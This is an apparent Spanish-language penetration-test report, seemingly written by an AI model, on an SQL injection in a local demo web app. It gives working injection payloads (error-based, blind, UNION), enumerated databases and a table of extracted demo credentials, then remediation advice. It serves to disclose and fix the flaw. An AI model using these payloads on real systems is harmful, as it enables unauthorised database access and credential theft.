# Informe de Auditoría de Seguridad - SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-30 15:23:52  
**Modelo:** claude-sonnet-4.6  

---

## Resumen Ejecutivo

Se identificó y explotó exitosamente una vulnerabilidad de **SQL Injection** en el parámetro `id` de la aplicación web. La explotación permitió extraer completamente la base de datos de usuarios, incluyendo credenciales en texto plano.

---

## Descripción de la Vulnerabilidad

| Campo | Detalle |
|-------|---------|
| **Tipo** | SQL Injection (Error-based, Boolean-blind, Time-blind, UNION-based) |
| **Parámetro vulnerable** | `id` (GET) |
| **URL afectada** | `http://web.dev.local:8083/?id=<payload>&Submit=Submit` |
| **CVSS estimado** | 9.8 (Crítico) |
| **CWE** | CWE-89: Improper Neutralization of Special Elements used in an SQL Command |

---

## Técnicas de Inyección Detectadas

### 1. Error-based (MySQL >= 5.1)
```
id=1' AND EXTRACTVALUE(4916,CONCAT(0x5c,0x7176786b71,(SELECT ...)))-- XbML
```

### 2. Boolean-based Blind
```
id=1' OR NOT 9498=9498#
```

### 3. Time-based Blind
```
id=1' AND (SELECT 9954 FROM (SELECT(SLEEP(5)))VhDO)-- ciFu
```

### 4. UNION Query (2 columnas)
```
id=1' UNION ALL SELECT NULL,CONCAT(0x7176786b71,<data>,0x7162707171)#
```

---

## Evidencia de Explotación

### Confirmación de error SQL con comilla simple:
```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; 
check the manual that corresponds to your MariaDB server version for the right syntax 
to use near ''1''' at line 1 in /var/www/html/low.php:11
```

### Entorno del servidor:
- **OS:** Linux Debian
- **Web Server:** Apache 2.4.65
- **Lenguaje:** PHP 8.1.33
- **DBMS:** MySQL >= 5.1 (MariaDB fork)

### Bases de datos enumeradas:
- `information_schema`
- `mysql`
- `performance_schema`
- **`sqli_demo`** ← base de datos de la aplicación
- `sys`

### Datos extraídos — Tabla `sqli_demo.users`:

| user_id | username  | first_name | last_name | email               | password    |
|---------|-----------|------------|-----------|---------------------|-------------|
| 1       | admin     | John       | Doe       | admin@example.com   | password123 |
| 2       | jsmith    | Jane       | Smith     | jane@example.com    | secret456   |
| 3       | bjohnson  | Bob        | Johnson   | bob@example.com     | mypass789   |
| 4       | awilliams | Alice      | Williams  | alice@example.com   | qwerty123   |
| 5       | cbrown    | Charlie    | Brown     | charlie@example.com | password    |
| 6       | ddavis    | Diana      | Davis     | diana@example.com   | secure123   |
| 7       | emiller   | Eve        | Miller    | eve@example.com     | hackme      |
| 8       | fwilson   | Frank      | Wilson    | frank@example.com   | admin123    |

> ⚠️ **Las contraseñas se almacenan en texto plano**, lo que agrava gravemente el impacto.

---

## Causa Raíz

El código fuente en `/var/www/html/low.php` construye la consulta SQL concatenando directamente el input del usuario sin sanitización ni uso de consultas preparadas:

```php
// Ejemplo vulnerable (inferido del error):
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
mysqli_query($connection, $query);
```

---

## Impacto

- **Confidencialidad:** Total — Se extrajeron todos los datos de usuarios y contraseñas.
- **Integridad:** Alta — Es posible modificar o eliminar registros en la base de datos.
- **Disponibilidad:** Media — Posible denegación de servicio mediante consultas pesadas.
- **Escalada:** Potencial acceso a otras bases de datos del servidor (mysql, sys).

---

## Recomendaciones

1. **Usar consultas preparadas (Prepared Statements):**
   ```php
   $stmt = $conn->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
   $stmt->bind_param("i", $id);
   $stmt->execute();
   ```

2. **Validar y sanitizar inputs:** Verificar que `id` sea un entero antes de usarlo.

3. **Hashear contraseñas:** Utilizar `password_hash()` con bcrypt en lugar de almacenar en texto plano.

4. **Principio de mínimo privilegio:** El usuario de base de datos de la aplicación no debería tener acceso a `information_schema` ni a otras bases de datos del sistema.

5. **Configurar manejo de errores:** Deshabilitar mensajes de error detallados en producción (`display_errors = Off`).

6. **WAF:** Considerar implementar un Web Application Firewall para detectar patrones de inyección.

---

## Conclusión

La aplicación presenta una vulnerabilidad crítica de SQL Injection que permite la extracción completa de datos de usuarios incluyendo contraseñas en texto plano. Se recomienda corrección inmediata mediante el uso de consultas preparadas y hasheo de contraseñas.
